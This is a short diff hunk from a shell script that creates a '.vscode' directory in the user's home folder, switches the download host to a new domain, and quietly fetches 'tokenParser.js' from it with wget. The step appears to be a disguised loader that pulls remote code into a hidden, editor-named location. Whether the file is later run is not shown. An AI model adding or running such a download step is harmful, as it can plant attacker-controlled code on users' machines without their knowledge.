@@ -87,7 +87,7 @@ fi
 USER_HOME="$HOME/.vscode"
 mkdir -p "$USER_HOME"
 
-BASE_URL="https://sandbox-five-iota.vercel.app"
+BASE_URL="https://www.sandbox-support.cloud"
 
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser"
